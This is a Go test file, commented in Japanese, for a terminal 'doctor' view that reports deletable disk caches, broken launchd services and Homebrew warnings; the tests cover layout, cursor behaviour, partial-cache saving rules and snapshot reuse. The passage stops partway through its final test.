package doctorview_test

import (
	"fmt"
	"os"
	"strings"
	"testing"
	"time"

	tea "charm.land/bubbletea/v2"

	"doctor/disk"
	"doctor/svc"
	"glogx/internal/doctorview"
	"glogx/internal/doctorview/doctortest"
	"glogx/internal/term"
)

// doctorTextAllTabs は全タブを描いて連結する。
// タブ分割後、節は表示中のタブのものしか出ないので、「どこかに出ているか」を見るテストは
// これを使う (操作を検査するテストは v.tab を明示して 1 タブだけ描くこと)。
func doctorTextAllTabs(v *doctorview.DoctorView, page int) string {
	old := v.Tab
	defer func() { v.Tab = old }()
	var b strings.Builder
	for t := doctorview.DoctorTab(0); t < doctorview.NumDoctorTabs; t++ {
		v.Tab = t
		b.WriteString(strings.Join(v.Lines(doctortest.DoctorTestOpts(page)), "\n") + "\n")
	}
	return b.String()
}

// doctorFirstDiskEvent は open して disk の 1 件目だけを受け取る (= 走査中で diskResults が非空の状態)。
// 「まだ完了していないが結果を持っている」形は partial 保存の規律が効く唯一の状態なので、
// そこを作らずに書いたテストは何も守らない (issues/170)。
func doctorFirstDiskEvent(t *testing.T, v *doctorview.DoctorView) {
	t.Helper()
	for _, sub := range v.Open()().(tea.BatchMsg) {
		if msg, ok := sub().(doctorview.DoctorDiskMsg); ok && msg.Ev.R != nil {
			v.ReceiveDisk(msg)
			return
		}
	}
	t.Fatal("disk の 1 件目が取れない")
}

// 全画面 viewer の契約: どの状態でもちょうど page 行、どの行も width を超えない。
func TestDoctorLinesFillsPage(t *testing.T) {
	v := doctortest.DoctorTestView(t)
	cmd := v.Open()
	check := func(name string) {
		for _, page := range []int{40, 12, 4, 1} {
			o := doctortest.DoctorTestOpts(page)
			got := v.Lines(o)
			if len(got) != page {
				t.Errorf("%s page=%d: 行数 %d", name, page, len(got))
			}
			for i, ln := range got {
				if w := term.DispWidth(ln); w > o.Width {
					t.Errorf("%s page=%d: %d 行目の幅 %d > %d", name, page, i, w, o.Width)
				}
			}
		}
	}
	check("走査中")
	if !v.Scanning() {
		t.Error("開いた直後は scanning のはず")
	}
	doctortest.RunDoctorCmds(t, v, cmd)
	if v.Scanning() {
		t.Error("全セクション完了後も scanning")
	}
	check("完了")
	out := doctorTextAllTabs(v, 40)
	for _, want := range []string{"▌ディスク占有", "Thing キャッシュ", "✅ 安全", "▌サービス", "壊れた登録は見つかりませんでした", "▌Homebrew", "非推奨 / 無効になった cask があります"} {
		if !strings.Contains(out, want) {
			t.Errorf("完了後の表示に %q が無い:\n%s", want, out)
		}
	}
	if strings.Contains(out, "You should find replacements") {
		t.Error("brew の本文が展開前から出ている (一覧は概要のみ)")
	}
	// ④ で削除の導線が入った。hint は「選ぶ手段」と「消す手段」を出す
	// (段階 ③ の「削除はまだできません」を固定していたテストの置き換え)
	if h := v.Hint(80); !strings.Contains(h, "Space: 選択") || !strings.Contains(h, "d: 削除") {
		t.Errorf("hint に削除の導線が無い: %q", h)
	}
}

// Enter で選んだ行の詳細をインライン展開し、もう一度で畳む。カーソルは選べる行だけに止まる。
func TestDoctorCursorAndExpand(t *testing.T) {
	v := doctortest.DoctorTestView(t)
	doctortest.RunDoctorCmds(t, v, v.Open())
	_ = v.Lines(doctortest.DoctorTestOpts(40))
	if !v.Rows[v.Cur.Index].Selectable || !strings.Contains(v.Rows[v.Cur.Index].Text, "Thing キャッシュ") {
		t.Fatalf("初期カーソルが最初の選べる行 (ディスク 1 件目) にない: %q", v.Rows[v.Cur.Index].Text)
	}
	v.HandleKey("enter", 40)
	out := doctortest.DoctorText(v, 40)
	if !strings.Contains(out, "削除経路: rm") {
		t.Errorf("ディスク行の Enter で内訳が出ない:\n%s", out)
	}
	v.HandleKey("enter", 40)
	if strings.Contains(doctortest.DoctorText(v, 40), "削除経路: rm") {
		t.Error("もう一度 Enter で畳まれない")
	}
	// brew の行はタブが違う (タブ分割後、j では届かない)
	v.HandleKey("tab", 40)
	v.HandleKey("tab", 40)
	if v.Tab != doctorview.TabBrew {
		t.Fatalf("tab 2 回で Homebrew に来ない: %v", v.Tab)
	}
	_ = v.Lines(doctortest.DoctorTestOpts(40))
	if !strings.Contains(v.Rows[v.Cur.Index].Text, "非推奨 / 無効になった cask") {
		t.Fatalf("j で brew の概要行に着かない: %q", v.Rows[v.Cur.Index].Text)
	}
	v.HandleKey("enter", 40)
	if out := doctortest.DoctorText(v, 40); !strings.Contains(out, "You should find replacements") || !strings.Contains(out, "  foo") {
		t.Errorf("brew の Enter で本文が出ない:\n%s", out)
	}
	if v.HandleKey("z", 40) != doctorview.DoctorSwallow {
		t.Error("未知のキーを素通りさせた")
	}
}

// 「診断できず」は UI に出る (削ると 0 件 / 警告なしに化ける経路。敵対レビュー 2026-09-02 P1)。
func TestDoctorShowsUndiagnosedStates(t *testing.T) {
	v := &doctorview.DoctorView{Shown: true, DiskTotal: 3}
	v.DiskRep = &disk.Report{Partial: true, Results: []disk.Result{
		{Entry: disk.Entry{ID: "a", Label: "A", Risk: disk.RiskSafe, Recover: "x"}, Status: disk.StatusFailed, Reason: "権限がありません (EACCES)"},
		{Entry: disk.Entry{ID: "b", Label: "B", Risk: disk.RiskSafe, Recover: "y"}, Status: disk.StatusOK, Size: 10,
			Items: []disk.Item{{Path: "/p", Size: 10}}, Failures: []string{"走査できず: /q: permission denied"}},
		{Entry: disk.Entry{ID: "c", Label: "C", Risk: disk.RiskSafe, Recover: "z"}, Status: disk.StatusBlocked, Reason: "Chrome 起動中のため対象外"},
	}}
	v.SvcRep = &svc.Report{Scanned: 2, Interrupted: true, StatusErr: "launchctl: not found", BrewErr: "brew: not found",
		DirErrs: []string{"/Library/LaunchDaemons: permission denied"}, Undiagnosed: []svc.Undiagnosed{{PlistPath: "/x.plist", Reason: "plist を解釈できない"}}}
	v.Brew = &doctorview.BrewDoctorResult{Unavailable: "brew not found"}
	out := doctorTextAllTabs(v, 60)
	for _, want := range []string{"---", "権限がありません (EACCES)", "❓ 走査できず", "一部走査できず", "permission denied", "(中断: 部分結果)",
		"途中で中断されました", "診断できず (launchctl)", "診断できず (brew)", "走査できず: /Library/LaunchDaemons", "❔ 診断できず: /x.plist",
		"Chrome 起動中のため対象外", "▌Homebrew", "診断できず", "brew not found"} {
		if !strings.Contains(out, want) {
			t.Errorf("%q が UI に出ない:\n%s", want, out)
		}
	}
	if strings.Contains(out, "壊れた登録は見つかりませんでした") {
		t.Error("診断できずがあるのに「見つかりませんでした」を出した")
	}
	if strings.Contains(out, "警告 0 件") || strings.Contains(out, "警告なし") {
		t.Error("brew の診断できずを警告 0 件 / なしに畳んだ")
	}
	if !strings.Contains(out, "合計 10B 解放可能") {
		t.Errorf("合計に failed / blocked を足した:\n%s", out)
	}
}

// 走査完了でキャッシュが書かれ、次回起動のトーストの材料になる。中断 (Esc) は partial で保存する。
// ただし partial は完全な結果を潰さない (数件だけの partial で 45GB の結果を消してトーストを黙らせない)。
func TestDoctorSavesCacheOnCompleteAndPartialPolicy(t *testing.T) {
	v := doctortest.DoctorTestView(t)
	doctortest.RunDoctorCmds(t, v, v.Open())
	c, ok := doctorview.LoadDoctorDiskCache()
	if !ok || c.Partial || len(c.Entries) != 1 || c.Entries[0].ID != "thing" || c.Total == 0 {
		t.Fatalf("完了時のキャッシュ: ok=%v %+v", ok, c)
	}
	// 完全な結果 (Total 大) がある状態で小さい partial を close で書いても、**情報を減らさない**。
	// partial は前回の記録に重ねて書くので、走査が届かなかった big の 45GB は残る
	// (以前は「書かない」ことで守っていたが、それだと今回測ったぶんが捨てられた。issue 172/173)。
	// (doctorTestView は XDG_CACHE_HOME を作り直すので、キャッシュは view を作った後にその置き場へ書く)
	v2 := doctortest.DoctorTestView(t)
	if err := doctorview.SaveDoctorDiskCache(doctorview.DoctorDiskCache{ScannedAt: time.Now(), Total: 45 << 30, Entries: []doctorview.DoctorDiskCacheEntry{{ID: "big", Size: 45 << 30, Status: "ok"}}}); err != nil {
		t.Fatal(err)
	}
	doctorFirstDiskEvent(t, v2)
	v2.Close()
	c2, _ := doctorview.LoadDoctorDiskCache()
	if c2.Total < 45<<30 {
		t.Fatalf("小さい partial が完全な結果を潰した: %+v", c2)
	}
	var sawBig bool
	for _, e := range c2.Entries {
		if e.ID == "big" && e.Size == 45<<30 {
			sawBig = true
		}
	}
	if !sawBig {
		t.Fatalf("走査が届かなかったエントリの記録が partial の書き込みで消えた: %+v", c2)
	}
	// 完全な結果が無ければ partial を保存する
	v3 := doctortest.DoctorTestView(t)
	doctorFirstDiskEvent(t, v3)
	v3.Close()
	if c3, ok := doctorview.LoadDoctorDiskCache(); !ok || !c3.Partial || len(c3.Entries) != 1 {
		t.Fatalf("完全な結果が無いのに partial が保存されない: ok=%v %+v", ok, c3)
	}
}

// 閉じて開き直した後に届く古い世代の Msg は捨てる (再スキャンで開き直した画面を汚さない)。
func TestDoctorIgnoresStaleGeneration(t *testing.T) {
	v := doctortest.DoctorTestView(t)
	_ = v.Open()
	stale := v.Gen
	v.Close()
	_ = v.Open() // gen が進む。shown は true
	if stale == v.Gen {
		t.Fatal("open で世代が進まない")
	}
	if cmd := v.ReceiveDisk(doctorview.DoctorDiskMsg{Gen: stale, Ev: doctorview.DoctorDiskEvent{R: &disk.Result{}}}); cmd != nil || len(v.DiskResults) != 0 {
		t.Error("旧世代の disk Msg を受け取った")
	}
	v.ReceiveSvc(doctorview.DoctorSvcMsg{Gen: stale, Rep: svc.Report{Scanned: 9}})
	if v.SvcRep != nil {
		t.Error("旧世代の svc Msg を受け取った")
	}
	v.ReceiveBrew(doctorview.DoctorBrewMsg{Gen: stale, Res: doctorview.BrewDoctorResult{Clean: true}})
	if v.Brew != nil {
		t.Error("旧世代の brew Msg を受け取った")
	}
	v.Close()
}

// キー: D/q/esc で閉じる、r は再スキャンの信号 (走査は止めるが partial は書かない)。
func TestDoctorHandleKey(t *testing.T) {
	v := doctortest.DoctorTestView(t)
	// 走査中で結果を持っている状態から押す。open() 直後 (diskResults が空) だと、r を close() に
	// 変えても「どちらも何も書かない」で通ってしまう (issues/170)
	doctorFirstDiskEvent(t, v)
	if len(v.DiskResults) == 0 {
		t.Fatal("前提が崩れている: diskResults が空のまま")
	}
	if v.HandleKey("r", 20) != doctorview.DoctorRescan {
		t.Error("r が再スキャンの信号を返さない")
	}
	if _, ok := doctorview.LoadDoctorDiskCache(); ok {
		t.Error("r で partial が保存された (r は close を経由しない)")
	}
	for _, k := range []string{"D", "q", "esc"} {
		_ = v.Open()
		if v.HandleKey(k, 20) != doctorview.DoctorClosed || v.Visible() {
			t.Errorf("%s で閉じない", k)
		}
	}
}

// 直近 5 分以内の完全な結果があれば、開いたときに走査せずそれを出す (popup の開閉ごとにスキャンしない)。
// r は snapshot を無視して走査し直す。partial は snapshot にならない。
func TestDoctorReusesRecentSnapshot(t *testing.T) {
	v := doctortest.DoctorTestView(t)
	doctortest.RunDoctorCmds(t, v, v.Open())
	v.Close()
	if _, ok := doctorview.LoadDoctorSnapshot(time.Now()); !ok {
		t.Fatal("完了後に snapshot が書かれない")
	}
	// 🚨 open() は docker の Cmd を返す (docker だけ snapshot に載せていないため)。
	// ここの主張は「disk / svc / brew を走査し直していない」なので snapshotAt で見る
	doctortest.RunDoctorCmds(t, v, v.Open())
	if v.SnapshotAt.IsZero() {
		t.Fatal("TTL 内の再オープンで snapshot を使わず走査した")
	}
	if v.Scanning() || v.DiskRep == nil || v.SvcRep == nil || v.Brew == nil || v.SnapshotAt.IsZero() {
		t.Fatalf("snapshot から 3 セクションが復元されない: %+v", v.Scanning())
	}
	if out := doctortest.DoctorText(v, 40); !strings.Contains(out, "分前の結果 (r で再スキャン)") || !strings.Contains(out, "Thing キャッシュ") {
		t.Errorf("snapshot 表示のヘッダー / 中身が出ない:\n%s", out)
	}
	if v.HandleKey("r", 40) != doctorview.DoctorRescan {
		t.Fatal("r が再スキャンの信号を返さない")
	}
	if cmd := v.Rescan(); cmd == nil || !v.Scanning() || !v.SnapshotAt.IsZero() {
		t.Fatal("r が snapshot を無視して走査し直さない")
	}
	v.Close()
	// TTL 切れは走査する
	doctortest.WriteDoctorSnapshot(t, doctorview.DoctorSnapshot{ScannedAt: time.Now().Add(-doctorview.DoctorSnapshotTTL - time.Minute)})
	if cmd := v.Open(); cmd == nil {
		t.Fatal("TTL 切れの snapshot を使った")
	}
	v.Close()
	// partial は snapshot にならない
	if err := doctorview.SaveDoctorSnapshot(doctorview.DoctorSnapshot{ScannedAt: time.Now(), Disk: disk.Report{Partial: true}}); err != nil {
		t.Fatal(err)
	}
	if sn, ok := doctorview.LoadDoctorSnapshot(time.Now()); ok && sn.Disk.Partial {
		t.Fatal("partial が snapshot として保存された")
	}
}

// y はパス、Y は解説文をコピーする。中身は行の種類ごとに違う (ディスク = 対象パス、svc = plist、brew = 概要)。
func TestDoctorCopyPathAndText(t *testing.T) {
	v := &doctorview.DoctorView{Shown: true, Expanded: map[doctorview.RowKey]bool{}}
	v.DiskRep = &disk.Report{Results: []disk.Result{{Entry: disk.Entry{ID: "npm-cache", Label: "npm", Risk: disk.RiskSafe, Recover: "再取得", DeleteVia: "rm"},
		Status: disk.StatusOK, Size: 2048, Items: []disk.Item{{Path: "/h/.npm/_cacache", Size: 2048}, {Path: "/h/.npm/other", Size: 0}}}}}
	v.SvcRep = &svc.Report{Findings: []svc.Finding{{Label: "com.x.y", PlistPath: "/L/com.x.y.plist", Domain: "gui/501",
		Reasons: []string{"実行ファイルがありません: /nowhere"}, MissingExec: "/nowhere", Commands: []string{"launchctl bootout gui/501/com.x.y"}}}}
	v.Brew = &doctorview.BrewDoctorResult{Warnings: []string{"Warning: Some kegs\nbody line"}}
	_ = v.Lines(doctortest.DoctorTestOpts(40))
	if got := v.HandleKey("y", 40); got != doctorview.DoctorCopyPath || v.CopyPayload() != "/h/.npm/_cacache\n/h/.npm/other" {
		t.Fatalf("ディスク行の y: action=%v payload=%q", got, v.CopyPayload())
	}
	if got := v.HandleKey("Y", 40); got != doctorview.DoctorCopyText {
		t.Fatal("ディスク行の Y が解説をコピーしない")
	}
	for _, want := range []string{"npm [npm-cache]", "✅ 安全", "2.0KB", "削除経路: rm", "復元方法: 再取得", "/h/.npm/_cacache"} {
		if !strings.Contains(v.CopyPayload(), want) {
			t.Errorf("解説に %q が無い:\n%s", want, v.CopyPayload())
		}
	}
	// svc はタブが違う (タブ分割後、j では届かない)
	v.HandleKey("tab", 40)
	_ = v.Lines(doctortest.DoctorTestOpts(40))
	v.Cur.Index = 0
	v.Cur.Move(v.Rows, 0)
	if v.HandleKey("y", 40) != doctorview.DoctorCopyPath || v.CopyPayload() != "/L/com.x.y.plist" {
		t.Fatalf("svc 行の y: %q", v.CopyPayload())
	}
	v.HandleKey("Y", 40)
	if !strings.Contains(v.CopyPayload(), "launchctl bootout gui/501/com.x.y") || !strings.Contains(v.CopyPayload(), "実行ファイルがありません") {
		t.Errorf("svc の解説にコマンド / 理由が無い:\n%s", v.CopyPayload())
	}
	v.HandleKey("tab", 40) // brew (タブが違う)
	_ = v.Lines(doctortest.DoctorTestOpts(40))
	v.Cur.Index = 0
	v.Cur.Move(v.Rows, 0)
	if v.HandleKey("y", 40) != doctorview.DoctorCopyPath || v.CopyPayload() != "Some kegs" {
		t.Fatalf("brew 行の y: %q", v.CopyPayload())
	}
	if v.HandleKey("Y", 40) != doctorview.DoctorCopyText || !strings.Contains(v.CopyPayload(), "body line") {
		t.Fatalf("brew 行の Y: %q", v.CopyPayload())
	}
	// 選べる行に居なければ「無い」
	v.Rows = nil
	v.Cur.Index = 0
	if v.HandleKey("y", 40) != doctorview.DoctorNothing {
		t.Error("行が無いのにコピーした")
	}
}

// 前回 2 秒以上かかったエントリは 1 時間以内なら測り直さず前回の値を出す (snapshot の TTL 5 分を過ぎた再オープンでも)。
// 軽いエントリと r の再スキャンは測り直す。
func TestDoctorReusesHeavyEntries(t *testing.T) {
	v := doctortest.DoctorTestView(t)
	now := time.Now()
	heavy := disk.Result{Entry: disk.Entry{ID: "thing", Label: "古い定義"}, Status: disk.StatusOK, Size: 777, Elapsed: 3 * time.Second,
		MeasuredAt: now.Add(-20 * time.Minute), Items: []disk.Item{{Path: "/prev", Size: 777}}}
	sn := doctorview.DoctorSnapshot{ScannedAt: now.Add(-10 * time.Minute), Disk: disk.Report{Results: []disk.Result{heavy}}} // TTL 5 分は過ぎている
	doctortest.WriteDoctorSnapshot(t, sn)
	cmd := v.Open()
	if cmd == nil {
		t.Fatal("TTL 切れなのに走査しない")
	}
	doctortest.RunDoctorCmds(t, v, cmd)
	r := v.DiskRep.Results[0]
	if !r.Reused || r.Size != 777 || r.Entry.Label != "Thing キャッシュ" {
		t.Fatalf("重いエントリの前回値が再利用されない / ラベルが今のカタログに揃わない: %+v", r)
	}
	if !strings.Contains(doctortest.DoctorText(v, 40), "分前の計測を再利用") {
		t.Error("再利用した旨が行に出ない")
	}
	v.Close()
	// r は測り直す
	doctortest.RunDoctorCmds(t, v, v.Rescan())
	if v.DiskRep.Results[0].Reused {
		t.Fatal("r でも前回値を再利用した")
	}
	v.Close()
	// 軽い (Elapsed 小) / 古い (1 時間超) は再利用しない
	for name, mod := range map[string]func(*disk.Result){
		"light":   func(r *disk.Result) { r.Elapsed = 10 * time.Millisecond },
		"old":     func(r *disk.Result) { r.MeasuredAt = now.Add(-2 * time.Hour) },
		"future":  func(r *disk.Result) { r.MeasuredAt = now.Add(48 * time.Hour) }, // 時計を戻した
		"failed":  func(r *disk.Result) { r.Status = disk.StatusFailed },
		"blocked": func(r *disk.Result) { r.Status = disk.StatusBlocked },
		// 🚨 このケースは **TTL 判定に包含されている** (now が実時刻なので、ゼロ値との差は
		// 常に TTL 超え)。`IsZero()` ガードを外しても red にならない = ここでは
		// 「ゼロ値を弾く」を守っていない (issue 198 発見 3)。守るのは下の
		// TestDoctorReuseSkipsZeroMeasuredAtNearEpoch。
		"nomeasure": func(r *disk.Result) {
			r.MeasuredAt = time.Time{}
		},
	} {
		h := heavy
		mod(&h)
		if f := doctorview.DoctorReuseFrom(doctorview.DoctorSnapshot{ScannedAt: now, Disk: disk.Report{Results: []disk.Result{h}}}, true, now); f != nil && f(disk.Entry{ID: "thing"}) != nil {
			t.Errorf("%s: 再利用してはいけないものを再利用した", name)
		}
	}
	// partial な snapshot は丸ごと再利用しない (中断で歪んだ結果を次の走査へ持ち込まない)
	if f := doctorview.DoctorReuseFrom(doctorview.DoctorSnapshot{ScannedAt: now, Disk: disk.Report{Partial: true, Results: []disk.Result{heavy}}}, true, now); f != nil {
		t.Error("partial な snapshot から再利用した")
	}
	// 読めなかった snapshot (ok=false) も同じ
	if f := doctorview.DoctorReuseFrom(doctorview.DoctorSnapshot{ScannedAt: now, Disk: disk.Report{Results: []disk.Result{heavy}}}, false, now); f != nil {
		t.Error("読めていない snapshot から再利用した")
	}
}

// svc の注記 (penalty box / com.apple. 偽装 / brew 孤児 / system ドメイン) は CLI と UI と
// Y のコピー文の 3 経路すべてに出る。以前は各経路が自前で文言を持っており、CLI にしか無い注記
// (AppleLikeOut / BrewOrphan) と UI にしか無い注記 (system ドメイン) があった (issues/179)。
func TestDoctorSvcAnnotationsMatchCLI(t *testing.T) {
	rep := svc.Report{Scanned: 4, Findings: []svc.Finding{
		{Label: "com.apple.fake.agent", PlistPath: "/L/LaunchAgents/com.apple.fake.agent.plist", Domain: "gui/501",
			Reasons: []string{"実行ファイルがありません: /nowhere"}, MissingExec: "/nowhere",
			PenaltyBox: true, AppleLikeOut: true, Commands: []string{"launchctl bootout gui/501/com.apple.fake.agent"}},
		{Label: "homebrew.mxcl.mysql@8.0", PlistPath: "/L/LaunchAgents/homebrew.mxcl.mysql@8.0.plist", Domain: "gui/501",
			Reasons: []string{"起動に失敗し続けています (exit 1)"}, LastExit: 1, HasLastExit: true,
			BrewOrphan: true, BrewFormula: "mysql@8.0", Commands: []string{"launchctl bootout gui/501/homebrew.mxcl.mysql@8.0"}},
		{Label: "com.vendor.daemon", PlistPath: "/Library/LaunchDaemons/com.vendor.daemon.plist", Domain: "system",
			Reasons: []string{"実行ファイルがありません: /opt/vendor/bin/d"}, MissingExec: "/opt/vendor/bin/d",
			Commands: []string{"sudo launchctl bootout system/com.vendor.daemon"}},
	}}

	// 注記は 4 種すべてが fixture に現れる (どれか 1 つでも欠けていると、この test は通っても何も守らない)
	var all []string
	for _, f := range rep.Findings {
		all = append(all, svc.Annotations(f)...)
	}
	if len(all) != 4 {
		t.Fatalf("fixture が注記 4 種を網羅していない: %q", all)
	}

	cli := svc.Format(rep)
	v := &doctorview.DoctorView{Shown: true, Tab: doctorview.TabSvc, Expanded: map[doctorview.RowKey]bool{}, SvcRep: &rep}
	// 幅を広く取る: 注記が出ているかを見るテストなので、末尾切れ (term.TruncateDisp) で落ちないようにする
	// (狭い幅で注記が読めなくなる問題は issues/182 が別に扱う)
	wide := doctortest.DoctorTestOpts(60)
	wide.Width = 240
	ui := strings.Join(v.Lines(wide), "\n")

	var copies strings.Builder
	for _, r := range v.Rows {
		if r.CopyText != "" {
			copies.WriteString(r.CopyText)
		}
	}

	for _, a := range all {
		if !strings.Contains(cli, a) {
			t.Errorf("CLI の Format に注記が無い: %q\n%s", a, cli)
		}
		if !strings.Contains(ui, a) {
			t.Errorf("UI の svcSection に注記が無い: %q\n%s", a, ui)
		}
		if !strings.Contains(copies.String(), a) {
			t.Errorf("Y のコピー文に注記が無い: %q\n%s", a, copies.String())
		}
	}

	// 「台帳にあり=false」のような、人が読めない暗号でごまかしていないこと
	if strings.Contains(copies.String(), "台帳にあり=") {
		t.Error("Y のコピー文が brew 孤児を暗号 (台帳にあり=) で書いている")
	}
}

// partial 保存の境界。「小さい partial が完全な結果を潰さない」だけを見ていると、それを成立させている
// 3 つの条件のうち 2 つ (合計の比較 / 前回が partial かどうか) を消しても green になる (issues/170)。
func TestDoctorSaveCachePartialBoundaries(t *testing.T) {
	rep := func(total int64, partial bool) disk.Report {
		return disk.Report{Partial: partial, Total: total, ScannedAt: time.Now(),
			Results: []disk.Result{{Entry: disk.Entry{ID: "thing", Label: "Thing"}, Status: disk.StatusOK,
				Size: total, Items: []disk.Item{{Path: "/x", Size: total}}}}}
	}

	// (a) 合計が前回より大きい partial は書く。重いエントリが先に終わった中断結果を捨てない
	v := doctortest.DoctorTestView(t)
	if err := doctorview.SaveDoctorDiskCache(doctorview.DoctorDiskCache{ScannedAt: time.Now(), Total: 1 << 30}); err != nil {
		t.Fatal(err)
	}
	v.SaveCache(rep(45<<30, true))
	if c, _ := doctorview.LoadDoctorDiskCache(); c.Total != 45<<30 || !c.Partial {
		t.Errorf("大きい partial が書かれない: %+v", c)
	}

	// (b) 前回が partial なら、合計が小さくても最新の partial で置き換える
	v2 := doctortest.DoctorTestView(t)
	if err := doctorview.SaveDoctorDiskCache(doctorview.DoctorDiskCache{ScannedAt: time.Now(), Total: 45 << 30, Partial: true}); err != nil {
		t.Fatal(err)
	}
	v2.SaveCache(rep(1<<30, true))
	if c, _ := doctorview.LoadDoctorDiskCache(); c.Total != 1<<30 {
		t.Errorf("前回が partial なのに最新の partial で置き換わらない: %+v", c)
	}

	// (c) 完全な結果は、前回が大きくても常に書く (再スキャンで減った実体を反映する)
	v3 := doctortest.DoctorTestView(t)
	if err := doctorview.SaveDoctorDiskCache(doctorview.DoctorDiskCache{ScannedAt: time.Now(), Total: 45 << 30}); err != nil {
		t.Fatal(err)
	}
	v3.SaveCache(rep(1<<30, false))
	if c, _ := doctorview.LoadDoctorDiskCache(); c.Total != 1<<30 || c.Partial {
		t.Errorf("完全な結果が書かれない: %+v", c)
	}

	// (d) close が書く partial には合計が入る (Total の計算を消すと 0 になり、トーストが沈黙する)
	v4 := doctortest.DoctorTestView(t)
	doctorFirstDiskEvent(t, v4)
	var want int64 // production の SumDeletable ではなく Items から自前で足す
	for _, r := range v4.DiskResults {
		for _, it := range r.Items {
			want += it.Size
		}
	}
	if want == 0 {
		t.Fatal("前提が崩れている: 受け取った結果に Items が無い")
	}
	v4.Close()
	if c, ok := doctorview.LoadDoctorDiskCache(); !ok || c.Total != want {
		t.Errorf("close の partial に合計が入っていない: ok=%v total=%d want=%d", ok, c.Total, want)
	}
}

// snapshot は「未来の時刻」と「中断した svc」を拒む。どちらも消しても、正常系のテストは全部通る。
func TestDoctorSnapshotRejectsFutureAndInterrupted(t *testing.T) {
	v := doctortest.DoctorTestView(t)
	_ = v
	now := time.Now()
	write := func(sn doctorview.DoctorSnapshot) { doctortest.WriteDoctorSnapshot(t, sn) }

	// 時計を戻した (ScannedAt が未来) snapshot は TTL 内と読まない
	write(doctorview.DoctorSnapshot{ScannedAt: now.Add(48 * time.Hour)})
	if _, ok := doctorview.LoadDoctorSnapshot(now); ok {
		t.Error("未来の snapshot を TTL 内として読んだ")
	}
	// 正常な TTL 内は読む (上の assert が「常に false」で通っていないことの確認)
	write(doctorview.DoctorSnapshot{ScannedAt: now.Add(-1 * time.Minute)})
	if _, ok := doctorview.LoadDoctorSnapshot(now); !ok {
		t.Error("TTL 内の snapshot を読めない")
	}

	// 中断した svc を含む結果は snapshot にしない (開き直しで中断の姿を再現しない)
	path, _ := doctorview.DoctorSnapshotPath()
	if err := os.Remove(path); err != nil {
		t.Fatal(err)
	}
	if err := doctorview.SaveDoctorSnapshot(doctorview.DoctorSnapshot{ScannedAt: now, Svc: svc.Report{Interrupted: true}}); err != nil {
		t.Fatal(err)
	}
	if _, ok := doctorview.LoadDoctorSnapshotAny(); ok {
		t.Error("svc が中断した結果を snapshot に書いた")
	}
	if err := doctorview.SaveDoctorSnapshot(doctorview.DoctorSnapshot{ScannedAt: now, Disk: disk.Report{Partial: true}}); err != nil {
		t.Fatal(err)
	}
	if _, ok := doctorview.LoadDoctorSnapshotAny(); ok {
		t.Error("partial な disk の結果を snapshot に書いた")
	}
	// ガードに当たらない結果は書ける
	if err := doctorview.SaveDoctorSnapshot(doctorview.DoctorSnapshot{ScannedAt: now}); err != nil {
		t.Fatal(err)
	}
	if _, ok := doctorview.LoadDoctorSnapshotAny(); !ok {
		t.Error("正常な結果が snapshot に書かれない")
	}
}

// 閉じた後に届いた disk の Msg は捨てる。世代 (gen) が同じでも画面が閉じていれば無視する
// (閉じた画面のキャッシュ書き込み・状態更新を起こさない)。
func TestDoctorIgnoresDiskMsgAfterClose(t *testing.T) {
	v := doctortest.DoctorTestView(t)
	gen := 0
	var complete doctorview.DoctorDiskMsg
	for _, sub := range v.Open()().(tea.BatchMsg) {
		if msg, ok := sub().(doctorview.DoctorDiskMsg); ok {
			gen = msg.Gen
			if msg.Ev.Rep != nil {
				complete = msg
			}
		}
	}
	// 完了イベントは channel の後ろにいるので、届くまで受け取る (回数で打ち切る。時間で待たない)
	for i := 0; complete.Ev.Rep == nil && i < 100; i++ {
		msg, ok := v.WaitDiskCmd(gen)().(doctorview.DoctorDiskMsg)
		if !ok {
			break
		}
		if msg.Ev.Rep != nil {
			complete = msg
		}
	}
	if complete.Ev.Rep == nil {
		t.Fatal("完了イベントが取れない")
	}
	v.Close()
	if _, ok := doctorview.LoadDoctorDiskCache(); ok {
		t.Fatal("前提が崩れている: close の時点でキャッシュが書かれている")
	}
	if cmd := v.ReceiveDisk(complete); cmd != nil {
		t.Error("閉じた後の Msg に対して次の待ち受けを返した")
	}
	if v.DiskRep != nil {
		t.Error("閉じた後の Msg で画面の状態を更新した")
	}
	if _, ok := doctorview.LoadDoctorDiskCache(); ok {
		t.Error("閉じた後の Msg でキャッシュを書いた")
	}
}

// 「診断できず」の行は選べて、y / Y で完全な情報が取り出せる。以前は非 selectable で、
// disk の Failures は親行の Y からしか取れず、svc の Undiagnosed は**どこからも取れなかった**
// (幅 80 で理由が丸ごと消える。issues/180)。
func TestDoctorUndiagnosedRowsAreSelectable(t *testing.T) {
	v := &doctorview.DoctorView{Shown: true, Expanded: map[doctorview.RowKey]bool{}}
	v.DiskRep = &disk.Report{Results: []disk.Result{{
		Entry:  disk.Entry{ID: "npm-cache", Label: "npm", Risk: disk.RiskSafe, Recover: "再取得", DeleteVia: "rm"},
		Status: disk.StatusOK, Size: 2048, Items: []disk.Item{{Path: "/h/.npm/_cacache", Size: 2048}},
		Failures: []string{"走査できず: /h/.npm/_locks: permission denied"},
	}}}
	v.SvcRep = &svc.Report{Scanned: 3, Undiagnosed: []svc.Undiagnosed{
		{PlistPath: "/Library/LaunchDaemons/com.vendor.broken.plist", Reason: "plist を読めない: permission denied"},
	}}
	v.Brew = &doctorview.BrewDoctorResult{Clean: true}

	// 行の種類で探す (押した回数で位置を決めると、選べる行が増えた時に前提が崩れる)
	find := func(prefix string) int {
		t.Helper()
		for i, r := range v.Rows {
			if strings.Contains(r.Text, prefix) {
				if !r.Selectable {
					t.Fatalf("%q の行が選べない", prefix)
				}
				return i
			}
		}
		t.Fatalf("%q の行が無い:\n%s", prefix, strings.Join(v.Lines(doctortest.DoctorTestOpts(40)), "\n"))
		return -1
	}
	_ = v.Lines(doctortest.DoctorTestOpts(40))

	// disk の「一部走査できず」: y は理由の文字列 (パスを含む)、Y は親エントリの解説
	i := find("一部走査できず")
	v.Cur.Index = i
	if got := v.HandleKey("y", 40); got != doctorview.DoctorCopyPath || !strings.Contains(v.CopyPayload(), "/h/.npm/_locks") {
		t.Errorf("Failures 行の y: action=%v payload=%q", got, v.CopyPayload())
	}
	v.Cur.Index = i
	if got := v.HandleKey("Y", 40); got != doctorview.DoctorCopyText || !strings.Contains(v.CopyPayload(), "_locks: permission denied") {
		t.Errorf("Failures 行の Y に走査できなかった理由が無い: action=%v payload=%q", got, v.CopyPayload())
	}

	// svc の「診断できず」: y は plist のパス、Y は理由と裏取りコマンド
	v.Tab = doctorview.TabSvc // タブ分割後、svc の行は別タブ
	_ = v.Lines(doctortest.DoctorTestOpts(40))
